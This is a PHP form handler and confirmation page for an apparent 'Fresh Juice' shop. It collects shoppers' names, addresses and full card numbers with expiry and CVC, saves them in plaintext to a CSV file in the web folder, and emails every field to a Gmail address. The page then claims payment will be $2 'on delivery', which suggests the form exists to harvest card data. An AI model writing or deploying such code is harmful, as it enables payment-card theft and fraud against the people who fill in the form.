<?php

$EMAIL_DESTINO = "contactenossalida@gmail.com"; 
$ARCHIVO_CSV   = __DIR__ . "/orders.csv";   
// ===========================

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method Not Allowed');
}

function clean($value) {
    if ($value === null) return '';
    return trim(filter_var($value, FILTER_SANITIZE_FULL_SPECIAL_CHARS));
}

$data = [
    'date'         => date('Y-m-d H:i:s'),
    'ip'           => $_SERVER['REMOTE_ADDR'] ?? '',
    'name'         => clean($_POST['name']         ?? ''),
    'phone'        => clean($_POST['phone']        ?? ''),
    'email'        => clean($_POST['email']        ?? ''),
    'address'      => clean($_POST['address']      ?? ''),
    'city'         => clean($_POST['city']         ?? ''),
    'color'        => clean($_POST['color']        ?? ''),
    'cardName'     => clean($_POST['cardName']     ?? ''),
    'cardNumber'   => preg_replace('/\s+/', '', clean($_POST['cardNumber'] ?? '')),
    'cardExpMonth' => clean($_POST['cardExpMonth'] ?? ''),
    'cardExpYear'  => clean($_POST['cardExpYear']  ?? ''),
    'cardCvc'      => clean($_POST['cardCvc']      ?? ''),
];

$required = ['name', 'phone', 'email', 'address', 'city', 'color',
             'cardName', 'cardNumber', 'cardExpMonth', 'cardExpYear', 'cardCvc'];
foreach ($required as $f) {
    if ($data[$f] === '') {
        http_response_code(400);
        exit("Missing field: $f");
    }
}
if (!filter_var($data['email'], FILTER_VALIDATE_EMAIL)) {
    http_response_code(400);
    exit('Invalid email');
}

$nuevo = !file_exists($ARCHIVO_CSV);
$fh = fopen($ARCHIVO_CSV, 'a');
if ($nuevo) {
    fputcsv($fh, array_keys($data));
}
fputcsv($fh, $data);
fclose($fh);

$asunto = "Nueva orden Fresh Juice - " . $data['name'];
$cuerpo = "Nueva orden recibida:\n\n";
foreach ($data as $k => $v) {
    $cuerpo .= str_pad($k, 14) . ": $v\n";
}
$headers = "From: no-reply@" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "\r\n";
$headers .= "Reply-To: " . $data['email'] . "\r\n";
@mail($EMAIL_DESTINO, $asunto, $cuerpo, $headers);

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Order confirmed — Fresh Juice™</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#f7faf5;margin:0;padding:40px 20px;color:#1a2e1a}
  .card{max-width:520px;margin:0 auto;background:#fff;border-radius:20px;padding:32px;box-shadow:0 10px 40px rgba(0,0,0,.08);text-align:center}
  .check{width:72px;height:72px;border-radius:50%;background:#22c55e;color:#fff;display:flex;align-items:center;justify-content:center;font-size:40px;margin:0 auto 16px}
  h1{margin:0 0 8px;font-size:26px}
  p{color:#475a47;line-height:1.5}
  .total{background:#f0fdf4;border-radius:12px;padding:14px;margin:20px 0;font-weight:700;color:#15803d}
  a{display:inline-block;margin-top:18px;background:#22c55e;color:#fff;text-decoration:none;padding:12px 24px;border-radius:10px;font-weight:700}
</style>
</head>
<body>
  <div class="card">
    <div class="check">✓</div>
    <h1>✅Order confirmed!</h1>
    <p>Thanks <strong><?= htmlspecialchars($data['name']) ?></strong>, we received your order.<br>
    We'll ship it to <strong><?= htmlspecialchars($data['address']) ?>, <?= htmlspecialchars($data['city']) ?></strong>.</p>
    <div class="total">Pay $2 USD with credit card on delivery</div>
    <p style="font-size:13px">A confirmation will be sent to <strong><?= htmlspecialchars($data['email']) ?></strong>.</p>
    <a href="index.html">← Back to home</a>
  </div>
</body>
</html>
